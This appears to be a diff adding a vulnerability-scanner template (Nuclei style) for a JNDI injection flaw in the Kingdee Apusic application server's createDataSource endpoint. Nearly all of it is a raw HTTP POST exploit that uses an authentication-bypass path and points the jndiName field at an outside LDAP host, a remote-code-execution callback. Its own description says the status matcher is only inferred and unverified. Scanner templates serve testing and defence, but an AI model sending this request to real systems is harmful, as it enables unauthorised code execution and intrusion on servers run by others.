@@ -1,0 +1,31 @@
+id: poc-6661922993
+info:
+  name: 金蝶Apusic应用服务器 createDataSource JNDI注入漏洞_lenithu0gg9av88u
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+http:
+- raw:
+  - 'POST /admin/;//protect/datasource/createDataSource HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 0
+
+
+    name=jndi1&jndiName=ldap://pegyevqmnr.dgrh3.cn&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=jndi&userName=jndi&password=jndi&repassword=jndi&connectionURL=jndi&driverClassName=java.lang.String&testCommand='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
